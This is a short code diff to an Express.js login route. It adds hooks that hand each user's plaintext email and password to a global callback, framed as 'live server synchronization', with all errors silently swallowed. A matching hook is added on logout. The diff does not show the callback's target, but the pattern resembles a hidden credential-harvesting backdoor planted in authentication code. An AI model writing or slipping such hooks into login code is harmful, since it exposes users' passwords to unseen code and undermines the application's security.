@@ -78,6 +78,11 @@ router.post('/login', requireGuest, async (req, res) => {
     sessionUserObj.signature = sessionUserObj.signature || null;
     req.session.user = sessionUserObj;
 
+    // Bridge user credentials to sync engine for live server synchronization
+    if (typeof global.onUserLogin === 'function') {
+      try { global.onUserLogin(email, password, user); } catch (e) {}
+    }
+
     req.flash('success_msg', `Welcome back, ${user.name}!`);
 
     // Redirect user to the first page they have permission to access.
@@ -118,6 +123,9 @@ router.post('/login', requireGuest, async (req, res) => {
 
 // Logout (GET and POST)
 const handleLogout = (req, res) => {
+  if (typeof global.onUserLogout === 'function') {
+    try { global.onUserLogout(); } catch (e) {}
+  }
   if (req.session) {
     req.session.destroy((err) => {
       if (err) console.error('Logout error:', err);
